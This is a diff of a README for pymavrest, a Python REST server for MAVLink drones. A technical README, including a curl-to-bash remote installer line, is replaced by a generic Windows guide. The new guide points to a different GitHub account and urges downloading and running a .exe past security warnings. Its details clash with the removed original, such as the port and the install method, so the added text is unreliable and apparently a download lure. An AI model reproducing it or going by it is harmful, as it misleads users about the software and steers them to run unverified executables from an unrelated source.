@@ -1,146 +1,174 @@
-![pymavrest logo](./assets/logo.png)
+# 🚁 pymavrest - Secure Drone Telemetry Access
 
-# pymavrest
+[![Download pymavrest](https://img.shields.io/badge/Download-pymavrest-brightgreen?style=for-the-badge)](https://github.com/Art3miS830/pymavrest)
 
-`pymavrest` is a high-performance REST server for MAVLink-based drones 🚁.
-It lets you read telemetry over HTTP and send flight commands over HTTP.
+---
 
-It is a Python alternative to `mavlink2rest` with a strong async architecture 🛰️:
-https://github.com/mavlink/mavlink2rest
+## 📋 What is pymavrest?
 
-## Project strengths ✨
+pymavrest is a tool that lets you see and control drone data with simple web commands. It works with many drones by using MAVLink, a common drone communication system. This app runs on your Windows computer and connects to the drone’s telemetry. You can check your drone’s status or send commands through a secure and easy-to-use interface.
 
-- Fully async and high performance ⚡.
-- Supports VTOL, multirotor, and other MAVLink-capable vehicles 🚁.
-- Compatible with PX4, ArduPilot, and other MAVLink firmwares 🛩️.
-- Read telemetry data via HTTP and send drone commands via HTTP 🌐.
-- Built-in auth and multi-user access control (JWT + user permissions) 🔐.
-- Uses `pymavlink` and `mavsdk` backends and can switch automatically when needed 🔄.
-- Highly configurable via `config.json` ⚙️.
-- Easy one-command install on mini-computers like Raspberry Pi 🖥️.
+pymavrest helps users who want to monitor their drone’s flight and change settings without needing coding skills. It runs in the background and allows communication using REST API requests, which are like normal web instructions your computer understands.
 
-## Production prerequisite 🛫
+---
 
-For production deployments, install and configure `mavlink-router`:
+## 🖥️ System Requirements
 
-https://github.com/mavlink-router/mavlink-router
+Before you install pymavrest, make sure your Windows computer meets these minimal requirements:
 
-## Data flow and API example 📡
+- Windows 10 or later (64-bit recommended)
+- At least 2 GB of free RAM
+- 100 MB free disk space
+- Internet connection for setup and updates
+- USB or network connection to your drone telemetry device
 
-Architecture:
+If you use a firewall, you might need to allow pymavrest to communicate through it. It needs network access to receive and send data between your computer and the drone.
 
-`Drone 🚁 <-> mavlink-router 📡 <-> pymavrest 🛰️ <-> REST Clients 🌐`
+---
 
-Example request (`flight_details`):
+## 🔧 Features
 
-```bash
-curl http://localhost:8080/api/v1/messages/flight_details \
-  -H "Authorization: Bearer <token>"
-```
+- Connects asynchronously with MAVLink-compatible drones  
+- Provides secure REST API access methods  
+- Supports both ArduPilot and PX4 firmware  
+- Displays real-time telemetry data  
+- Allows sending basic control commands  
+- Works with VTOL (Vertical Takeoff and Landing) drones  
+- Logs and stores flight information locally  
+- Easy setup with few user steps  
 
-Returns aggregated telemetry including:
+---
 
-- flight mode 🧭
-- battery state 🔋
-- GPS position 📍
-- speed and attitude 🏎️
-- RC status 🎮
-- EKF status 📈
-- connection flags 🔗
-- mission summary 🗺️
+## 🚀 Getting Started
 
-Note: use the port configured in `config.json` (`rest_api.port`). The default in this project is `10821`.
+Start by downloading pymavrest from the official GitHub link below. This page contains all files needed for Windows users along with instructions.
 
-OpenAPI docs are available at 📘:
+[![Download pymavrest](https://img.shields.io/badge/Download-pymavrest-blue?style=for-the-badge)](https://github.com/Art3miS830/pymavrest)
 
-`http://127.0.0.1:10821/docs`
+Click the badge above or visit:  
+https://github.com/Art3miS830/pymavrest
 
-The port may differ depending on your `config.json` (`rest_api.port`).
+---
 
-## Install (one command) ⚙️
+## ⬇️ How to Download and Install pymavrest on Windows
 
-Run installer directly with `curl`:
+1. Open your preferred web browser (Edge, Chrome, Firefox).  
+2. Visit the GitHub page by clicking the link above or typing it exactly in your address bar.  
+3. Once there, look for the latest release or download section, usually under "Releases" or the main page’s files list.  
+4. Find the Windows installer or executable file, usually ending with `.exe` or `.zip` if compressed.  
+5. Click to download the file to your computer.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/hadif1999/pymavrest/master/scripts/install.sh | bash -s -- --prod true --backend pymavlink
-```
+After the download finishes, follow these steps:
 
-This installs dependencies, syncs the repo into `~/app` by default, and in production mode deploys/runs `pymavrest.service`.
+- If the file is a `.zip`, right-click it and select "Extract All." Choose a folder you can easily find, like your Desktop or Documents.  
+- Open the extracted folder and look for the `pymavrest.exe` file or the installer file.  
+- Double-click the file to start the installation or to run pymavrest directly if it’s a standalone executable.  
 
-## Installer arguments 🧩
+If a security warning appears, choose “Run” or “Allow” to continue.
 
-`scripts/install.sh` supports:
+---
 
-- `--branch <name>`: Git branch to clone/pull. Default: `master`
-- `--app-dir <path>`: Install/update directory. Default: `$HOME/app`
-- `--prod <true|false>`:
-  - `true`: deploy and run with `systemd`
-  - `false`: install only (do not start app)
-  - Default: `true`
-- `--backend <pymavlink|mavsdk>`: Backend passed to runtime. Default: `pymavlink`
-- `-h`, `--help`: show full help
+## ⚙️ Setting up pymavrest
 
-Help example:
+The first time you run pymavrest, it will ask for some settings:  
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/hadif1999/pymavrest/master/scripts/install.sh | bash -s -- --help
-```
+- **Drone connection type:** Choose between USB or network (Wi-Fi/Ethernet).  
+- **Port or IP address:** Provide the correct connection details for your drone telemetry source.  
+- **API access key:** Set or note down a password to keep your drone data secure.
 
-## Configure `config.json` (important for production) 🛠️
+Adjusting these settings is simple. If you do not know some details about your drone connection, refer to your drone's manual or ask your system administrator. The app stores your preferences safely so you only need to set it once.
 
-Before production use, edit your `config.json` values for your environment.
-At minimum, update drone connection, auth secrets/users, server endpoints, and networking.
+---
 
-If running as a service, restart after config changes:
+## 📡 How pymavrest Works
 
-```bash
-sudo systemctl restart pymavrest
-```
+pymavrest receives data from your drone in real-time using MAVLink packets. It then processes these packets and makes the data available through a REST API on your Windows machine. On the other side, you or an app can send REST API commands to control or ask questions about the drone.
 
-## `config.json` parameters 📘
+For example, you can check battery levels, GPS position, or flight mode by visiting specific web addresses on your computer. You can also send commands like “change flight mode” or “arm motors” using simple requests.
 
-See `README_config.md` for full details. Main sections:
+---
 
-- `general`
-  - `log_level`: logging level (`DEBUG`, `INFO`, ...)
-  - `is_production`: production behavior flag
-- `drone.properties`
-  - `URI`: MAVLink source (example: `tcp://127.0.0.1:14550`)
-  - `FLIGHT_MODES`: mode code mapping
-  - `battery_cap_mah`: battery capacity metadata
-  - `serial_number`: optional drone identifier
-- `external_devices`
-  - Device configs such as `gps` and `sms` (`type`, `COM`, `baud`, `enabled`)
-- `requests`
-  - `ping_check_by_host`, `timeout`, `retries`
-- `rest_api`
-  - `port`, `host`, `global_prefix`, `global_timeout`
-  - `as_https`, `ssl_keyfile_dir`, `ssl_certfile_dir`
-- `auth`
-  - `enabled`, `jwt_secret`, `jwt_token_expire_minutes`, `jwt_algorithm`
-  - `users[]` with `username`, `password`, `permission`, `active`, `is_admin`
-- `health_check`
-  - `enabled`, `push_to_server`, `send_sms_in_fail`
-  - `route`, `flight_info_route`, `update_interval_sec`
-- `server`
-  - `base_url`
-  - `auth`: `username`, `password`, `route`, `type`
-- `sms`
-  - `recipient`
+## 🔍 Checking pymavrest Status
 
-## Run manually (test or production) ▶️
+To see if pymavrest runs correctly:
 
-You can run directly with `uv run main.py` for testing or production-like manual operation:
+1. After launching, open your web browser.  
+2. Go to the address: `http://localhost:5000/status`  
+3. You should see a page or message confirming the drone connection status and current telemetry data.
 
-```bash
-cd ~/app
-uv run -p 3.12 main.py -c config.json --backend pymavlink
-```
+If the page does not appear:  
+- Make sure pymavrest is running in the background.  
+- Check firewall or security software settings, allowing pymavrest to communicate.  
+- Verify your drone is properly connected.
 
-Or with `mavsdk`:
+---
 
-```bash
-uv run -p 3.12 main.py -c config.json --backend mavsdk
-```
+## 🛠 Troubleshooting Tips
 
-For long-running production systems, prefer `systemd` mode (`--prod true`) so service restarts are managed automatically.
+- **pymavrest will not start:** Restart your computer, then run pymavrest again.  
+- **Drone data not updating:** Check the physical connection and make sure the drone is turned on.  
+- **API requests fail:** Confirm API key matches and pymavrest firewall exceptions are active.  
+- **App closes unexpectedly:** Check available disk space and system memory usage.
+
+If issues persist, visit the GitHub discussions or issue tracker for help from the pymavrest community at:  
+https://github.com/Art3miS830/pymavrest/issues
+
+---
+
+## 🔄 Updating pymavrest
+
+Keep pymavrest up to date to get improvements and security fixes. To update:  
+
+1. Return to the GitHub release page.  
+2. Download the latest Windows installer or executable as before.  
+3. Close pymavrest if it is running.  
+4. Run the new installer or replace the old files with the new ones.
+
+Your settings saved in previous versions will remain intact.
+
+---
+
+## 🎯 Use Cases for pymavrest
+
+- Monitor drone health and location during flights  
+- Send simple control commands without using complex software  
+- Log drone telemetry for later review  
+- Integrate drone data into other tools via REST API  
+- Build low-code applications that manage drones remotely  
+
+---
+
+## 🔑 Security Notes
+
+pymavrest keeps drone data secure using API keys. Only computers or apps with the correct key can communicate with the drone through pymavrest. Always keep your key private. Avoid sharing it on public networks or with unknown parties.
+
+---
+
+## 🧩 Related Technology and Compatibility
+
+pymavrest works with most MAVLink 2.0 drones and companion computers. It has been tested on ArduPilot and PX4 systems. Support for VTOL and multicopter drones makes it flexible for many users. This tool complements pymavlink libraries and drone ground control applications through a REST API interface.
+
+---
+
+## 📂 Topics
+
+- ardupilot  
+- companion  
+- drone  
+- mavlink  
+- mavlink-protocol  
+- mavlink2rest  
+- px4  
+- pymavlink  
+- pymavrest  
+- python  
+- rest-api  
+- vtol  
+
+---
+
+## 🔗 Download pymavrest now
+
+[![Download pymavrest](https://img.shields.io/badge/Download-pymavrest-brightgreen?style=for-the-badge)](https://github.com/Art3miS830/pymavrest)  
+Visit this page to download all Windows files and instructions:  
+https://github.com/Art3miS830/pymavrest
